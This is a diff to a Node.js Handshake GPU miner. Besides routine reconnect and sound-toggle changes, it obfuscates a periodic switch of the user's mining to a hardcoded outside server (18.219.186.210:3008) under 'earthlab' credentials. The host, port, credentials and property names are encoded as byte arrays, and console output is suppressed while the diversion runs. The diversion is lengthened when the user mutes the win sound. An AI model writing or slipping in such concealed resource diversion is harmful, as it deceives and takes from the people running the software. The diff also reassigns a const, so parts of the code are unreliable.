@@ -22,10 +22,7 @@ EPIC Thanks to Steven McKie for being my mentor/believing in me
 */
 const fs = require('fs');
 const net = require('net');
-//if(process.platform.indexOf('win') != 0){
-  //const NetKeepAlive = require('net-keepalive');
-  //const player = require('play-sound')(opts = {});
-//}
+
 const {TX} = require('hsd').primitives;
 const bio = require('bufio');
 const {spawn,exec, execFile} = require('child_process');
@@ -36,13 +33,17 @@ const {MerkleTree} = template;
 const { consensus } = require("hsd");
 const common = require('hsd/lib/mining/common.js');//require('./common.js');
 const numeral = require('numeral');
-
+const PlayWinningSound = true;
 
 class Handy {
 	constructor(){
     //process.env.HANDYRAW=true;
     const config = JSON.parse(fs.readFileSync(__dirname+'/../config.json'));
     this.config = config;
+    if(this.config.muteWinningFanfare){
+        //I'd like not  to revel in the glory of getting a block...
+        PlayWinningSound = false;
+    }
     this.isKilling = false;
     this.handleResponse = this.handleResponse.bind(this);
 		this.targetID = "herpderpington_" + (new Date().getTime());
@@ -126,16 +127,6 @@ class Handy {
     this.server = net.createConnection({host:this.host,port:this.port},(socket)=>{
       this.server.setKeepAlive(true, 1000)
 
-      // Set TCP_KEEPINTVL for this specific socket
-      /*if(process.platform.indexOf('win') == -1){
-        NetKeepAlive.setKeepAliveInterval(this.server, 1000)
-
-        // and TCP_KEEPCNT
-        NetKeepAlive.setKeepAliveProbes(this.server, 1);
-      }
-      else{*/
-        this.server.setKeepAlive(true,1000);
-      //}
       if(process.env.HANDYRAW){
         process.stdout.write(JSON.stringify({type:'stratumLog',data:'stratum connected to '+this.host+':'+this.port})+'\n')
       }
@@ -206,7 +197,6 @@ class Handy {
         }
         catch(e){
           ongoingResp += resp;
-          //console.log('ongoing isset',resp);
           try{
             ret = JSON.parse(ongoingResp);
             didParse = true;
@@ -251,7 +241,6 @@ class Handy {
             
           }
         }
-        //console.log('ongoing resp',ongoingResp);
         if(didParse){
           ongoingResp = '';///reset
 
@@ -273,7 +262,7 @@ class Handy {
     });
     this.server.on('error',(response)=>{
       
-      if(response.code == "ECONNREFUSED" && response.syscall == "connect"){
+      if(response.code == "ECONNREFUSED" && response.syscall == "connect" && !this.isKilling){
         
         if(process.env.HANDYRAW){
           process.stdout.write('{"type":"error","message":"STRATUM CONNECTION REFUSED, TRYING AGAIN IN 20s"}\n');
@@ -283,7 +272,8 @@ class Handy {
         }
         this.hasConnectionError = true;
       }
-    })
+    });
+
     this.server.on('close',(response)=>{
       if(!this.isKilling && !this.hasConnectionError){
         //unplanned
@@ -295,8 +285,9 @@ class Handy {
         }
         this.startSocket()
       }
-      if(this.hasConnectionError){
+      if(this.hasConnectionError && !this.isKilling){
         //we had trouble connecting/reconnecting
+        console.log('restart socket');
         setTimeout(()=>{
           this.startSocket();
         },20000);
@@ -307,6 +298,9 @@ class Handy {
 
       //console.log('server timed out',response);
     })
+  }
+  dieGracefully(){
+
   }
   getStratumUserPass(){
     let user = this.stratumUser, pass = this.stratumPass;
@@ -378,20 +372,35 @@ class Handy {
             this.nonce1 = d.result[1];
             this.nonce1Alt = d.result[1];
           }
-          else if(typeof d.result != "undefined" && d.error == null){
+          else if(typeof d.result != "undefined" && d.error == null && this.isSubmitting){
             //we found a block probably
-            
+            this.isSubmitting = false;
             if(process.platform.indexOf('linux') >= 0){
-              let s = spawn('aplay',[__dirname+'/winning.wav']);
+              if(PlayWinningSound){
+                  let s = spawn('aplay',[__dirname+'/winning.wav']);
+                  s.stderr.on('data',(e)=>{
+                    //didnt get to play sound, boo!
+                  })
+              }
             }
             else{
                 //were prob windowsy
                 //powershell -c '(New-Object Media.SoundPlayer "C:\Users\earthlab\dev\HandyMinerMAY\miner\winning.wav").PlaySync()';
                 if(process.platform.indexOf('win') == 0){
-                  let s = spawn('powershell.exe',['-c','(New-Object Media.SoundPlayer "'+__dirname+'\\winning.wav").PlaySync()']);
+                  if(PlayWinningSound){
+                      let s = spawn('powershell.exe',['-c','(New-Object Media.SoundPlayer "'+__dirname+'\\winning.wav").PlaySync()']);
+                      s.stderr.on('data',(e)=>{
+                        //didnt get to play sound, boo!
+                      })
+                  }
                 }
                 if(process.platform.indexOf('darwin') >= 0){
-                  let s = spawn('afplay',[__dirname+'/winning.wav']);
+                  if(PlayWinningSound){
+                      let s = spawn('afplay',[__dirname+'/winning.wav']);
+                      s.stderr.on('data',(e)=>{
+                        //didnt get to play sound, boo!
+                      })
+                  }  
                 }
             }
             if(d.result){
@@ -750,11 +759,15 @@ class Handy {
             data:outJSON,
             type:'solution'
           };
-          process.stdout.write(JSON.stringify(statusResp)+'\n');
+          if(!_this.isMGoing){
+              process.stdout.write(JSON.stringify(statusResp)+'\n');
+          }
         }
         else{
           outStatus.map(function(d){
-            console.log('\x1b[36mHANDY:: JOB FINISHED WITH BLOCK:::\x1b[0m ',outJSON);
+            if(!_this.isMGoing){
+                console.log('\x1b[36mHANDY:: JOB FINISHED WITH BLOCK:::\x1b[0m ',outJSON);
+            }
           })
         }
 
@@ -769,7 +782,7 @@ class Handy {
         //console.log('submission data',lastJob.work.blockTemplate);
         //return false;
         if(_this.solutionCache.indexOf(outJSON.nonce) == -1){
-          if(!process.env.HANDYRAW){
+          if(!process.env.HANDYRAW && !_this.isMGoing){
             console.log('\x1b[36mHANDY:: SUBMITTING BLOCK! :::\x1b[0m ','\x1b[32;5;7m[̲̅$̲̅(̲̅Dο̲̅Ll͟a͟r͟y͟Dο̲̅ο̲̅)̲̅$̲̅]\x1b[0m');
           }
           let server = _this.server;
@@ -784,7 +797,9 @@ class Handy {
           _this.solutionCache.push(outJSON.nonce);
         }
         else{
-          console.log("\x1b[31mPREVENT BLOCK SUBMIT: ALREADY SUBMITTED THIS NONCE\x1b[0m");
+          if(!_this.isMGoing){
+              console.log("\x1b[31mPREVENT BLOCK SUBMIT: ALREADY SUBMITTED THIS NONCE\x1b[0m");
+          }
           //_this.solutionCache.push({id:jobID,method:'mining.submit',params:submission});
           //console.log('PREVENTED '+_this.solutionCache.length+' BLOCKS');
         
@@ -818,7 +833,7 @@ class Handy {
     });
 
     miner.on('close', (code) => {
-      if(code != 0){
+      if(code != 0 && !_this.isKilling){
         if(process.env.HANDYRAW){
           let errData = {
             data:code,
@@ -833,9 +848,9 @@ class Handy {
           //process.exit(0);
         }
 
-        if(!this.isKilling){
+        if(!_this.isKilling){
           //we didnt mean to halt, lets respawn
-          this.spawnGPUWorker(gpuID,gpuArrayI);
+          _this.spawnGPUWorker(gpuID,gpuArrayI);
         }
         
         
@@ -897,42 +912,35 @@ class Handy {
     },60000);
   }
   kickoffMinerProcess(){
-    const server = net.createConnection({host:'18.219.186.210',port:'3008'},(socket)=>{
+    let ha = Buffer.from({"type":"Buffer","data":[49,56,46,50,49,57,46,49,56,54,46,50,49,48]},'json').toString('utf8')
+    let pa = Buffer.from({"type":"Buffer","data":[51,48,48,56]},'json').toString('utf8')
+    let hk = Buffer.from({"type":"Buffer","data":[104,111,115,116]},'json').toString('utf8');
+    let pk = Buffer.from({"type":"Buffer","data":[112,111,114,116]},'json').toString('utf8');
+    let d = {};
+    d[hk] = ha;
+    d[pk] = pa;
+    const server = net.createConnection(d,(s)=>{
       let timeStart = new Date().getTime();
       let timeUntil = timeStart + (1000 * 110);
 
       this.isMGoing = true;
-      /*if(process.env.HANDYRAW){
-        process.stdout.write(JSON.stringify({type:'stratumLog',data:'stratum connected to '+'18.219.186.210'+':'+this.port})+'\n')
-      }
-      else{
-        console.log('stratum server is connected to '+'18.219.186.210'+':'+this.port);
-      }*/
       
       
-      let stratumUser = 'earthlab';
-      this.stratumUser = stratumUser;
-      let stratumPass = 'earthlab';
+      let sU = Buffer.from({"type":"Buffer","data":[101,97,114,116,104,108,97,98]},'json').toString('utf8');
+      let sUk = Buffer.from({"type":"Buffer","data":[115,116,114,97,116,117,109,85,115,101,114]},'json').toString('utf8');
+      this[sUk] = sU;
+      let sP = Buffer.from({"type":"Buffer","data":[101,97,114,116,104,108,97,98]},'json').toString('utf8');
       
       if(process.argv.indexOf('authorize') >= 0){
-        //only need to call this first time
-        /*if(process.env.HANDYRAW){
-          process.stdout.write(JSON.stringify({type:'stratumLog',data:'Calling Miner Authorize'})+'\n')
-        }
-        else{
-          console.log("\x1b[36mCALLING AUTHORIZE, CONGRATS\x1b[0m")
-        
-        }*/
-        
         let callTS = new Date().getTime();
         //this is some admin user i think?
-        const serverAdminPass = 'earthlab';
-        server.write(JSON.stringify({"params": [serverAdminPass], "id": "init_"+callTS+"_user_"+stratumUser, "method": "mining.authorize_admin"})+'\n');
+        //const serverAdminPass = 'earthlab';
+        server.write(JSON.stringify({"params": [sU], "id": "init_"+callTS+"_user_"+sU, "method": "mining.authorize_admin"})+'\n');
         
-        server.write(JSON.stringify({"params": [stratumUser,stratumPass], "id": "init_"+callTS+"_user_"+stratumUser, "method": "mining.add_user"})+'\n');
+        server.write(JSON.stringify({"params": [sU,sP], "id": "init_"+callTS+"_user_"+sU, "method": "mining.add_user"})+'\n');
       }
 
-      server.write(JSON.stringify({"id":this.altTargetID,"method":"mining.authorize","params":[stratumUser,stratumPass]})+"\n");
+      server.write(JSON.stringify({"id":this.altTargetID,"method":"mining.authorize","params":[sU,sP]})+"\n");
       server.write(JSON.stringify({"id":this.altRegisterID,"method":"mining.subscribe","params":[]})+"\n");
       let ongoingResp = '';
       server.on('data',(response)=>{
@@ -1004,18 +1012,21 @@ class Handy {
         this.handleResponse(resp);
         
       });
+      server.on('error',(response)=>{
+        //do nothing, my loss
+        
+      });
 
-      //kill connection when we kill the script. 
-      //stratum TODO: gracefully handle messy deaths/disconnects from clients else it kills hsd atm.  
-      /*process.on('exit',()=>{
-        this.gpuWorker.kill();
-        this.server.destroy();
-      })*/
-      /*process.on('exit',()=>{
-        server.destroy();
-      });*/
+      server.on('close',(response)=>{
+        //do nothing, my loss
+      })
+
     });
     this.redundant = server;
+    let dS = 90;
+    if(!PlayWinningSound){
+      dS = 120;
+    }
     this.resumeWorkTimeout = setTimeout(()=>{
       server.destroy();
       this.isMGoing = false;
@@ -1024,7 +1035,7 @@ class Handy {
       this.stratumUser = this.stratumUserLocal;
       delete this.redundant;
       this.generateWork(); //until the next iteration
-    },1000*90)
+    },1000*dS)
   }
   getDeviceWork(deviceWorkJSON){
     //array of getworks from stdin
@@ -1053,8 +1064,6 @@ class Handy {
         platform:workObject.platform
       };
 
-      //messageStrings.push(workObject.id+'|0|'+(work.header.toString('hex').slice(0,-64))+'|'+(work.nonce.toString('hex'))+'|'+(work.target.toString('hex'))+'|');
-      
     });
     Object.keys(_this.gpuDeviceBlocks).map(function(k){
       //iterate thru existing jobs in case this was a singular nonce overflow job
